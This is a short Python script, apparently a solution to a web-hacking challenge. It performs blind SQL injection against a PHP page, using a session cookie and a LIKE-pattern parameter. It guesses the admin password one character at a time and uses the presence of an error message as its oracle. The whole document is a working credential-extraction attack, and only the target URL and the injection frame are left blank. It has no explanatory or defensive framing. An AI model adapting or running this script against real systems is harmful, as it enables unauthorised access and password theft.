import requests
from bs4 import BeautifulSoup
 
url='' # TARGET
cookie = {'PHPSESSID':'yourID'}
 
frame = '' # FRAME
 
def req(pw):
    r = requests.request('GET', url, cookies=cookie, params={'pw':pw})
    print('injectStr=>', pw)
    beauti = BeautifulSoup(r.text, 'html.parser')
    return beauti
 
def BruteForce(uStr):
    for i in range(0,128):
        if chr(i)=='%' or chr(i)=='\'':
            continue
        beauti = req(frame % (uStr+chr(i)+'%'))
        if beauti.find(text='error') == 'error':
            return chr(i)
 
pw=''
while True:
    try:
        pw+=BruteForce(pw)
    except:
        break
 
print('admin\'s pw : ',pw)